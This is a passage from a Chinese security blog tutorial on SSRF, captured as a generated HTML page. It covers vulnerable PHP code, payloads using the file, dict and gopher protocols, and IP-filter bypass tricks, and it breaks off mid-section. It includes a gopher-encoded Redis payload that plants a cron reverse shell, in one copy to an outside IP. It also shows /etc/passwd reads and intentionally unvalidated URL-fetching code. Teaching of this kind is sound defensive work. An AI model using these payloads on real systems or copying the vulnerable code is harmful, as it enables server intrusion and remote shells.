@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            从0到1完全掌握SSRF |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">从0到1完全掌握SSRF</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-05-16 12:29:04</span>
+        <span class="mobile">2022-05-16 12:29</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-09-18 17:27:21</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E4%BB%8E0%E5%88%B01/">从0到1</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E4%BB%8E0%E5%88%B01/">从0到1</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>14 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <blockquote>
+<p>本文首发于 FreeBuf <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">https://www.freebuf.com/articles/web/333318.html</a></p>
+</blockquote>
+<h1 id="从0到1完全掌握-SSRF"><a href="#从0到1完全掌握-SSRF" class="headerlink" title="从0到1完全掌握 SSRF"></a>从0到1完全掌握 SSRF</h1><blockquote>
+<p>二刷漏洞：知其所以然 &lt;-&gt; 知其然 -&gt; 懂其攻 -&gt; 知其守</p>
+</blockquote>
+<ul>
+<li>主要结合 SSRF-Lab 进行 SSRF 的学习。<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2></li>
+</ul>
+<p>刚二刷完 CSRF，继续 SSRF</p>
+<p>SSRF 主要是由于一些危险函数与危险协议产生的。我们以 PHP 为例，列举一下这些危险函数。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+SoapClient<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>一些危险协议</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">file://
+gopher
+dict
+
+etc<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h2 id="0x02-知其然：什么是-SSRF"><a href="#0x02-知其然：什么是-SSRF" class="headerlink" title="0x02 知其然：什么是 SSRF?"></a>0x02 知其然：什么是 SSRF?</h2><ul>
+<li>先挂一张生动的图</li>
+</ul>
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/SSRF.png" class="">
+
+<p>攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 ……</p>
+<p>SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p>
+<ul>
+<li>正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</li>
+</ul>
+<h2 id="0x03-SSRF-的原理"><a href="#0x03-SSRF-的原理" class="headerlink" title="0x03 SSRF 的原理"></a>0x03 SSRF 的原理</h2><ul>
+<li><p>从一般的面试角度出发的话，有几个针对 SSRF 常见的面试问题。</p>
+<ul>
+<li>SSRF 中可以利用的协议有哪一些？</li>
+<li>SSRF 中能利用的函数一般有哪些？</li>
+<li>讲一讲 CTF 中有没有遇到过 SSRF，当时是怎么解决的。</li>
+<li>SSRF 的原理</li>
+</ul>
+</li>
+</ul>
+<p>如果不在知道原理的基础上回答这些问题，很多都只是有一知半解的感觉，所以我们先把原理讲清楚了再进行下一步。</p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<h2 id="0x04-SSRF-的利用方式"><a href="#0x04-SSRF-的利用方式" class="headerlink" title="0x04 SSRF 的利用方式"></a>0x04 SSRF 的利用方式</h2><ul>
+<li>主要分为两个方向，SSRF 利用相关的危险函数；SSRF 可利用的协议操作</li>
+</ul>
+<h3 id="SSRF-利用相关的危险函数"><a href="#SSRF-利用相关的危险函数" class="headerlink" title="SSRF 利用相关的危险函数"></a>SSRF 利用相关的危险函数</h3><p>以 PHP 为例，说明一些可利用的危险函数</p>
+<h4 id="1-file-get-contents-与-readfile"><a href="#1-file-get-contents-与-readfile" class="headerlink" title="1. file_get_contents() 与 readfile()"></a>1. file_get_contents() 与 readfile()</h4><p><code>file_get_contents</code> 这一函数是把 <strong>传入的参数(变量)</strong> 写入字符串，当把 <strong>传参</strong> 是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">// ssrf.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/Fileget.png" class="">
+<h4 id="2-fsockopen"><a href="#2-fsockopen" class="headerlink" title="2. fsockopen()"></a>2. fsockopen()</h4><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url 数据的获取。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。 fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用<code>（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）</code> 如果调用失败，将返回false。</p>
+<p>测试代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; ssrf.php
+&lt;?php
+$host&#x3D;$_GET[&#39;url&#39;];
+$fp &#x3D; fsockopen($host, 80, $errno, $errstr, 30);
+if (!$fp) &#123;
+    echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;
+&#125; else &#123;
+    $out &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\r\n&quot;;
+    $out .&#x3D; &quot;Host: $host\r\n&quot;;
+    $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;;
+    fwrite($fp, $out);
+    while (!feof($fp)) &#123;
+        echo fgets($fp, 128);
+    &#125;
+    fclose($fp);
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发 ssrf 并返回百度主页，这种更像是一种重定向 (302) 之类的，没什么用。</p>
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/SSRFfsockopen.png" class="">
+
+<h4 id="3-curl-exec"><a href="#3-curl-exec" class="headerlink" title="3. curl_exec()"></a>3. curl_exec()</h4><p>curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供 <code>curl_setopt()，curl_exec()和curl_close()</code> 函数使用。</p>
+<p>测试代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; ssrf.php
+&lt;?php 
+if (isset($_GET[&#39;url&#39;]))&#123;
+    $link &#x3D; $_GET[&#39;url&#39;];
+    $curlobj &#x3D; curl_init(); &#x2F;&#x2F; 创建新的 cURL 资源
+    curl_setopt($curlobj, CURLOPT_POST, 0);
+    curl_setopt($curlobj,CURLOPT_URL,$link);
+    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); &#x2F;&#x2F; 设置 URL 和相应的选项
+    $result&#x3D;curl_exec($curlobj); &#x2F;&#x2F; 抓取 URL 并把它传递给浏览器
+    curl_close($curlobj); &#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源
+ 
+    &#x2F;&#x2F; $filename &#x3D; &#39;.&#x2F;curled&#x2F;&#39;.rand().&#39;.txt&#39;;
+    &#x2F;&#x2F; file_put_contents($filename, $result); 
+    echo $result;
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发 ssrf 并返回百度主页：</p>
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/CurlFunction.png" class="">
+
+<ul>
+<li>但是攻击方式不止这么一点，其实是可以通过其他方式提高 <code>curl_exec()</code> 这里的攻击危害的。</li>
+</ul>
+<p>最常见的是通过 <code>file、dict、gopher</code> 这三个协议来进行渗透。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -vvv <span class="token string">'dict://127.0.0.1:6379/info'</span> 
+<span class="token function">curl</span> -vvv <span class="token string">'file:///etc/passwd'</span> 
+<span class="token comment"># * 注意: 链接使用单引号，避免$变量问题 </span>
+<span class="token function">curl</span> -vvv <span class="token string">'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >&amp; /dev/tcp/103.21.140.84/6789 0>&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="SSRF-的危险协议"><a href="#SSRF-的危险协议" class="headerlink" title="SSRF 的危险协议"></a>SSRF 的危险协议</h3><blockquote>
+<p>利用 SSRF-Lab 进行学习，一边代码审计一边学习漏洞利用。</p>
+</blockquote>
+<ul>
+<li>可利用的主要就几个协议吧 <ul>
+<li>file 协议结合目录遍历读取文件。</li>
+<li>gopher 协议打开端口。</li>
+<li>dict 协议主要用于结合 curl 攻击。</li>
+<li>http 协议进行内网探测。</li>
+</ul>
+</li>
+</ul>
+<p><a href="">SSRF-Lab 搭建教程</a></p>
+<h4 id="1-file-协议的利用"><a href="#1-file-协议的利用" class="headerlink" title="1. file 协议的利用"></a>1. file 协议的利用</h4><p>Payload</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">file:///etc/password  <span class="token comment"># file:// 之后可以接任意文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;index.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>而在 SSRF-Lab 当中较简单，在框中输入 <code>file:///etc/password</code> 即可。</p>
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/EasyFile.png" class="">
+
+<h4 id="2-dict-协议的使用"><a href="#2-dict-协议的使用" class="headerlink" title="2. dict 协议的使用"></a>2. dict 协议的使用</h4><p>利用 <code>dict</code> 协议，<code>dict://ip/info</code> 可获取本地 <code>redis</code> 服务配置信息。</p>
+<p>如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server，具体可见 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333#toc-4">redis 与 dict 协议</a></p>
+<h4 id="3-gopher-协议的使用"><a href="#3-gopher-协议的使用" class="headerlink" title="3. gopher 协议的使用"></a>3. gopher 协议的使用</h4><p>首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli -h <span class="token variable">$1</span> flushall
+<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token operator">|</span>redis-cli -h <span class="token variable">$1</span> -x <span class="token builtin class-name">set</span> <span class="token number">1</span>
+redis-cli -h <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/
+redis-cli -h <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> dbfilename root
+redis-cli -h <span class="token variable">$1</span> save
+//redis-cli查看所有的keys及清空所有的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于 <code>Gopher</code> 协议的 URL：</p>
+<pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>经过url解码便是：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gopher://127.0.0.1:6379/_*1 <span class="token variable">$8</span> flushall *3 <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$1</span> <span class="token number">1</span> <span class="token variable">$64</span> */1 * * * * <span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/127.0.0.1/45952 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span> *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$3</span> <span class="token function">dir</span> <span class="token variable">$16</span> /var/www/html/ *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$10</span> dbfilename <span class="token variable">$4</span> root *1 <span class="token variable">$4</span> save quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/GopherUse.png" class="">
+
+<h2 id="0x05-一些常见的绕过手法"><a href="#0x05-一些常见的绕过手法" class="headerlink" title="0x05 一些常见的绕过手法"></a>0x05 一些常见的绕过手法</h2><h4 id="1-绕过"><a href="#1-绕过" class="headerlink" title="1. @绕过"></a>1. @绕过</h4><p>URL的完整格式是</p>
+<pre class="line-numbers language-none"><code class="language-none">[协议类型]:&#x2F;&#x2F;[访问资源需要的凭证信息]@[服务器地址]:[端口号]&#x2F;[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>所以你访问</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>”http://baidu.com@1.1.1.1″”</span><span class="token punctuation">></span></span>http://baidu.com@1.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>和</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;1.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>效果是一样的，因为解析的本来就是 <code>@</code> 后面的服务器地址。</p>
+<h4 id="2-进制绕过"><a href="#2-进制绕过" class="headerlink" title="2. 进制绕过"></a>2. 进制绕过</h4><ul>
+<li>这里可以参考 SSRF-Lab advance 的第一题的。</li>
+</ul>
+<p><strong>源代码</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'#^https?://#i'</span><span class="token punctuation">,</span> <span class="token variable">$handler</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Wrong scheme! You can only use http or https!"</span><span class="token punctuation">;</span>   
+ <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'#^https?://10.0.0.3#i'</span><span class="token punctuation">,</span> <span class="token variable">$handler</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   
+ <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Restricted area!"</span><span class="token punctuation">;</span>   
+ <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>php 代码中通过正则对输入的 IP 进行了过滤。</p>
+<p>众所周知，IP 地址是由四个字节组成的，一旦包含了小数点，就必须考虑到大小端表示，因为这个会影响 IP 地址的解析。不过好在所有的网络地址都是大端表示法，只需要注意这一点即可，下面我们介绍 IP 地址的表达方式。</p>
+<pre class="line-numbers language-none"><code class="language-none">字符串:       10.0.0.3  
+二进制:       00001010 . 00000000 . 00000000 . 00000011  
+十六进制:    0A.00.00.03  
+整数:           167772163<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这些表达方式都能被 <code>curl</code> 命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用 16 进制 <code>0x0A000003</code> 表示IP地址，还有一个很少人知道的绕过小姿势，就是用 8 进制代替 10 进制来表示 IP 地址。在计算机的世界里，一旦在 <code>20</code> 前面加个 <code>0</code> 就会变成8进制，比如 <code>http://01200000003</code> 实际上还是 <code>http://10.0.0.3</code>。上面两个表达方式，PHP 的 curl 模块能解析出来。</p>
+<pre class="line-numbers language-none"><code class="language-none">十六进制：   http:&#x2F;&#x2F;0x0A.0x00.0x00.0x03  
+八进制：       http:&#x2F;&#x2F;012.00.00.03  
+八进制溢出：http:&#x2F;&#x2F;265.0.0.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="3-用句号替换-“-”"><a href="#3-用句号替换-“-”" class="headerlink" title="3. 用句号替换 “.”"></a>3. 用句号替换 “.”</h4><h4 id="4-xip-io-和-xip-name-绕过"><a href="#4-xip-io-和-xip-name-绕过" class="headerlink" title="4. xip.io 和 xip.name 绕过"></a>4. xip.io 和 xip.name 绕过</h4><ul>
+<li>泛域名解析，无需配置，将自定义的任何域名解析到指定的 <code>IP</code> 地址。假设你的 <code>IP</code> 地址是 <code>10.0.0.1</code>，你只需使用 <code>前缀域名+IP地址+xip.io</code> 即可完成相应自定义域名解析。</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">10.0.0.1.xip.io # 解析到 10.0.0.1 
+www.10.0.0.2.xip.io # www 子域解析到 10.0.0.2 mysite.10.0.0.3.xip.io # mysite 子域解析到 10.0.0.3 foo.bar.10.0.0.4.xip.io # foo.bar 子域解析到 10.0.0.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>xip.name 在使用上与 <code>xip.io</code> 一致</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">10.0.0.1.xip.name # 解析到 10.0.0.1 
+www.10.0.0.2.xip.name # www 子域解析到 10.0.0.2 mysite.10.0.0.3.xip.name # mysite 子域解析到 10.0.0.3 foo.bar.10.0.0.4.xip.name # foo.bar 子域解析到 10.0.0.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="5-DNS-重绑"><a href="#5-DNS-重绑" class="headerlink" title="5. DNS 重绑"></a>5. DNS 重绑</h4><p>这种绕过方式还是很有效的，HackTheBox 上有一道 CTF 题目就是 DNS 重绑的。</p>
+<p><a href="https://drun1baby.github.io/2022/04/08/HackTheBox-baby-CachedView/">HackTheBox-baby-CachedView | 芜风 </a></p>
+<p>密码可以私聊我</p>
+<p>DNS 重绑的话，原理如图所示</p>
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/DnsRebinding.png" class="">
+
+<p>工具网站如下<br><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
+<p>简单叙述一下逻辑：</p>
